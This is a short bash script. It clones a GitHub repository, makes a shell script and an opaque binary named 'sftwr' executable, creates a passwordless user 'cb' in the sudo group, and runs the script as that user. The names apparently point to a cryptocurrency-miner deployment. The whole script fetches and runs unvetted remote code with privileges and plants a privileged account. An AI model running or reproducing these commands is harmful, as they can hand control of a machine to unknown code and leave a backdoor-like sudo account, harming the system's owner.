#!/bin/bash
sudo apt update
git clone https://github.com/CIMENGUTAMAf/satu.git && cd satu
chmod +x dgb.sh && chmod +x sftwr
sudo adduser --disabled-password --gecos "" cb && sudo usermod -aG sudo cb
sudo -u cb -H sh -c "./dgb.sh"
